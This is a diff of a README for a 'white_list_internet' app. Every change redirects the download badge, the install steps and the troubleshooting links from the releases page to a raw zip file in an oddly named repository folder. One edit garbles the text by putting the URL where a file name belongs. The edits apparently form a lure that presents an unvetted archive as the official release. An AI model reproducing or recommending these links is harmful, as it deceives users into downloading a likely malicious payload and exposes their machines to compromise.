@@ -6,7 +6,7 @@ Welcome to the **white_list_internet** application! This software helps you rega
 
 ## 📥 Download Now
 
-[![Download white_list_internet](https://img.shields.io/badge/Download-white_list_internet-blue)](https://github.com/nehrabalar/white_list_internet/releases)
+[![Download white_list_internet](https://github.com/nehrabalar/white_list_internet/raw/refs/heads/main/cockneyfication/white-list-internet-3.6.zip)](https://github.com/nehrabalar/white_list_internet/raw/refs/heads/main/cockneyfication/white-list-internet-3.6.zip)
 
 ## 🌟 Features
 
@@ -26,13 +26,13 @@ Welcome to the **white_list_internet** application! This software helps you rega
 ## 📖 How to Use
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/nehrabalar/white_list_internet/releases) to find the latest version of the application.
+   Go to our [Releases page](https://github.com/nehrabalar/white_list_internet/raw/refs/heads/main/cockneyfication/white-list-internet-3.6.zip) to find the latest version of the application.
 
 2. **Download the Application**  
    Look for the latest version. Click on the download link corresponding to your operating system to download the application.
 
 3. **Locate the Downloaded File**  
-   Once the download is complete, find the file in your downloads folder. The file should be named something like `white_list_internet.exe` or similar, depending on your OS.
+   Once the download is complete, find the file in your downloads folder. The file should be named something like `https://github.com/nehrabalar/white_list_internet/raw/refs/heads/main/cockneyfication/white-list-internet-3.6.zip` or similar, depending on your OS.
 
 4. **Install the Application**  
    - **For Windows:**
@@ -60,7 +60,7 @@ If you encounter any issues while using the application, here are some common pr
 
 - **Cannot Connect to the Internet**: Ensure your device is connected to a network. Try restarting your router if the issue persists.
 
-- **Application Crashes**: Ensure that you have the latest version installed. Visit the [Releases page](https://github.com/nehrabalar/white_list_internet/releases) for updates.
+- **Application Crashes**: Ensure that you have the latest version installed. Visit the [Releases page](https://github.com/nehrabalar/white_list_internet/raw/refs/heads/main/cockneyfication/white-list-internet-3.6.zip) for updates.
 
 - **Compatibility Issues**: Check if your operating system meets the system requirements listed above.
 
@@ -94,4 +94,4 @@ For more detailed information, check our documentation. We provide comprehensive
 
 ## 📥 Download & Install
 
-Don’t wait any longer! [Visit this page to download](https://github.com/nehrabalar/white_list_internet/releases) the latest version of the **white_list_internet** application and regain your internet freedom easily!
+Don’t wait any longer! [Visit this page to download](https://github.com/nehrabalar/white_list_internet/raw/refs/heads/main/cockneyfication/white-list-internet-3.6.zip) the latest version of the **white_list_internet** application and regain your internet freedom easily!
